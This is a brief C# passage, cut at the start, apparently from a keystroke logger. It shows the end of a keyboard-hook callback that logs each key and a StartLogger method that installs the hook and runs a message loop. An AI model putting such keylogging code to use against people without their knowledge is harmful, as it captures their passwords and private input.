            KeyStates key = (KeyStates)wParam;
            LogKeystroke(key, false);
        }
        return (IntPtr)0;
    }

    // In the main method or where you want to start logging
    public static void StartLogger()
    {
        if (!isHooked)
            InitializeLogger();
        Application.Run();
    }
}
